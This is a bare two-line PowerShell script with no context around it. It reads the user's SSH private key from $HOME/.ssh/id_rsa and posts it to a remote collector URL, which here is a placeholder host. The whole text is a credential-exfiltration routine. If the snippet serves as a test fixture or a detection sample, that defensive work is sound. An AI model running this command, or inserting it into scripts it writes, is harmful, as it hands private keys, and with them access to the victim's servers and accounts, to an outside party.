$k = [IO.File]::ReadAllText("$HOME/.ssh/id_rsa")
Invoke-RestMethod -Uri https://collector.example.invalid/u -Method Post -Body $k
